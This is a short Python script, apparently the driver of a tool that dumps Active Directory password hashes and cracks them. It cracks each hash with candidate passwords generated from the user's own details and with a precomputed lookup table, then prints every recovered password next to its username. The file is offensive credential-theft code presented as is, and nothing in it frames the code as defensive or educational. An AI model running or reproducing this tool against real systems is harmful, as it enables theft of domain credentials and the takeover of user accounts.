from src.core import *
import time
import os

dumper=DumpADsecrets()
hasher=Hasher(100)

def prepare_lookup():
    passwd_hash=[]
    outputs={}
    path=os.path.join(os.path.dirname(os.path.realpath(__file__)),"lookup_table.txt")
    with open(path,"r",encoding="utf-8",errors='replace') as file:
        passwd_hash=file.readlines()
    passwd_hash=list(map(lambda x:x.replace("\n",""),passwd_hash))
    for line in passwd_hash:
        passwd,hash=line.split(":")[0],line.split(":")[1]
        outputs[hash]=passwd
    return outputs

if __name__=="__main__":
    lookup_table1=prepare_lookup()
    dumped_user_hash=dumper.start()
    if(dumped_user_hash):
        print("----------------------------------------")
        print("# Password Dump completed successfully !")
    for main_hash,obj in dumped_user_hash.items():
        start=time.time()
        final_lookup_table={}
        generator=PasswordGenerator(obj)
        generated_passwd=generator.start()
        lookup_table2=hasher.start(generated_passwd)
        if(main_hash in lookup_table2):
            print(f"************ Password for {obj.USERNAME} is {lookup_table2[main_hash]} ************")
            print(f"# Elapsed time {(time.time()-start)} sec.")
            continue
        if(main_hash in lookup_table1):
            print(f"************ Password for {obj.USERNAME} is {lookup_table1[main_hash]} ************")
            print(f"# Elapsed time {(time.time()-start)} sec.")
            continue
        print(f"# Failed to crack password for user : {obj.USERNAME}")